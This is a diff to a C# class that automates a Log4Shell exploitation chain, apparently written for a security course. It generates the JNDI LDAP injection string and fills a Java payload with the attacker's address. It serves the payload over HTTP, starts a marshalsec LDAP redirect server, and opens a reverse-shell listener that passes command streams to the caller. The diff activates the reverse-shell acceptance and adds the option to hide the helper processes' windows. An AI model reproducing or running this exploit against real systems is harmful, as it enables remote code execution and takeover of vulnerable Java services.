@@ -9,86 +9,94 @@ namespace CybBezWireshark
     internal class Log4Shell
     {        
         public event Action<string>? ErrorLog;
+        public event Action<string, StreamReader, StreamWriter>? AcceptConnection;
 
-        private int payloadCodeBaseServerPort;
-        private int ldapServerPort;
-        private int reverseShellListenerPort;
         private string jdkPath;
-        private string localIPAddress;
         private string networkAdapterName;
 
         private Process payloadCodeBaseServer;
         private Process ldapServer;
 
         private Socket reverseSellServer;
+        private Socket client;
 
         private NetworkStream netStream;
         private StreamReader reader;
         private StreamWriter writer;
 
+        public int PayloadCodeBaseServerPort { get; set; }
+        public int LdapServerPort { get; set; }
+        public int ReverseShellListenerPort { get; set; }
+        public bool ShowTerminals { get; set; }
+        public bool IsRunning { get; private set; } = false;
+        public string LocalIPAddress { get; private set; }
 
         public Log4Shell(IConfiguration config)
         {
-            payloadCodeBaseServerPort = config.GetValue<int>("payloadCodeBaseServerPort");
-            ldapServerPort = config.GetValue<int>("ldapServerPort");
-            reverseShellListenerPort = config.GetValue<int>("reverseShellListenerPort");
             jdkPath = config.GetValue<string>("jdkPath");
             networkAdapterName = config.GetValue<string>("networkAdapterName");
+
+            SetLocalIp();
         }
 
-        public string GetInjection()
-        {
-            if (localIPAddress == null) throw new Exception("Invoke Start() first.");
-            return $"${{jndi:ldap://{localIPAddress}:{ldapServerPort}/Run}}";
-        }
+        public string GetInjection() => $"${{jndi:ldap://{LocalIPAddress}:{LdapServerPort}/Run}}";
 
         public void Start()
         {
             try
             {
-                SetLocalIp();
                 CreatePayloadFile();
                 CompliePayload();
                 StartPayloadCodeBaseServer();
                 StartLdapServer();
-                //StartReverseShellServer();
-
-                //StartConnection().Wait();
+                StartReverseShellServer();
             }
             catch (Exception ex)
             {
                 ErrorLog?.Invoke(ex.ToString());
             }
-        }
 
-        public async Task<(StreamReader, StreamWriter)> StartConnection()
-        {
-            netStream?.Dispose();
-            reader?.Dispose();
-            writer?.Dispose();
-
-            var shellSocket = await reverseSellServer.AcceptAsync();
-            netStream = new NetworkStream(shellSocket);
-            reader = new StreamReader(netStream);
-            writer = new StreamWriter(netStream);
-
-            return (reader, writer);
+            IsRunning = true;
         }
 
         private void StartReverseShellServer()
         {
-            IPEndPoint ipe = new IPEndPoint(IPAddress.Any, reverseShellListenerPort);
+            IPEndPoint ipe = new IPEndPoint(IPAddress.Any, ReverseShellListenerPort);
             reverseSellServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             reverseSellServer.Bind(ipe);
             reverseSellServer.Listen(1);
+            reverseSellServer.BeginAccept(AcceptCallback, reverseSellServer);
+
+            void AcceptCallback(IAsyncResult ar)
+            {
+                netStream?.Dispose();
+                reader?.Dispose();
+                writer?.Dispose();
+                client?.Close();
+                client?.Dispose();
+
+                Socket listener = (Socket)ar.AsyncState;
+
+                try
+                {
+                    client = listener.EndAccept(ar);
+                }
+                catch { return; }
+
+                netStream = new NetworkStream(client);
+                reader = new StreamReader(netStream);
+                writer = new StreamWriter(netStream);
+
+                AcceptConnection?.Invoke(((IPEndPoint)client.RemoteEndPoint).Address.ToString(), reader, writer);
+            }
         }
 
         private void StartLdapServer()
         {
             ldapServer = new Process();
             ldapServer.StartInfo.FileName = $"{jdkPath}\\bin\\java.exe";
-            ldapServer.StartInfo.Arguments = $"-cp Resources\\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://{localIPAddress}:{payloadCodeBaseServerPort}/CodeBase/#Run {ldapServerPort}";
-            //ldapServer.StartInfo.CreateNoWindow = true;
+            ldapServer.StartInfo.Arguments = $"-cp Resources\\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://{LocalIPAddress}:{PayloadCodeBaseServerPort}/CodeBase/#Run {LdapServerPort}";
+            ldapServer.StartInfo.CreateNoWindow = !ShowTerminals;
 
             ldapServer.Start();
         }
@@ -96,7 +104,7 @@ namespace CybBezWireshark
         private void SetLocalIp()
         {
             NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
-            localIPAddress = interfaces.First(i => i.Name == networkAdapterName).GetIPProperties().UnicastAddresses
+            LocalIPAddress = interfaces.First(i => i.Name == networkAdapterName).GetIPProperties().UnicastAddresses
                                        .First(a => a.Address.AddressFamily == AddressFamily.InterNetwork).Address
                                        .ToString();
         }
@@ -104,8 +112,8 @@ namespace CybBezWireshark
         private void CreatePayloadFile()
         {
             var code = File.ReadAllText("Resources\\Run.java");
-            code = code.Replace("{ADDRESS}", localIPAddress);
-            code = code.Replace("{PORT}", reverseShellListenerPort.ToString());
+            code = code.Replace("{ADDRESS}", LocalIPAddress);
+            code = code.Replace("{PORT}", ReverseShellListenerPort.ToString());
             File.WriteAllText($"{Path.GetTempPath()}Run.java", code);
         }
 
@@ -113,10 +121,10 @@ namespace CybBezWireshark
         {
             payloadCodeBaseServer = new Process();
             payloadCodeBaseServer.StartInfo.FileName = $"Resources\\PayloadCodeBaseServer.exe";
-            payloadCodeBaseServer.StartInfo.Arguments = $"--urls http://*:{payloadCodeBaseServerPort} {Path.GetTempPath()}Log4Shell";
-            //payloadCodeBaseServer.StartInfo.CreateNoWindow = true;
-            //payloadCodeBaseServer.StartInfo.RedirectStandardError = true;
-            //payloadCodeBaseServer.ErrorDataReceived += (sender, e) => ErrorLog?.Invoke($"PayloadCodeBaseServer: {e.Data}");
+            payloadCodeBaseServer.StartInfo.Arguments = $"--urls http://*:{PayloadCodeBaseServerPort} {Path.GetTempPath()}Log4Shell";
+            payloadCodeBaseServer.StartInfo.CreateNoWindow = !ShowTerminals;
+            payloadCodeBaseServer.StartInfo.RedirectStandardError = true;
+            payloadCodeBaseServer.ErrorDataReceived += (sender, e) => ErrorLog?.Invoke($"PayloadCodeBaseServer: {e.Data}");
 
             payloadCodeBaseServer.Start();
             //payloadCodeBaseServer.WaitForExit();
@@ -153,9 +161,14 @@ namespace CybBezWireshark
             reverseSellServer?.Close();
             reverseSellServer?.Dispose();
 
+            client?.Close();
+            client?.Dispose();
+
             netStream?.Dispose();
             reader?.Dispose();
             writer?.Dispose();
+
+            IsRunning = false;
         }
     }
 }
